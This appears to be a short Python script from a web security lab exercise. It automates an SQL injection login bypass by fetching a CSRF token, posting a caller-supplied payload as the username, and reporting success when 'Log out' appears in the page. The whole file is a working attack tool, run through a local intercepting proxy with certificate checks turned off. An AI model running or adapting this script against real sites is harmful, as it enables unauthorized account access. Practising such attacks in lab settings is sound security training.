import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}


def get_csrf_token(url, sess):
    r = sess.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"})["value"]

    return csrf


def exploit_sqli(url, payload, sess):
    csrf = get_csrf_token(url, sess)

    data = {"csrf": csrf, "username": payload, "password": "randomdata"}
    r = sess.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] {sys.argv[0]} <url> <payload>")
        print(f"[-] {sys.argv[0]} http://example.com '1=1'")
        sys.exit(-1)
    sess = requests.Session()
    if exploit_sqli(url, payload, sess):
        print("[+] SQL Injection successful")
    else:
        print("[-] SQL Injection Unsuccessful!")
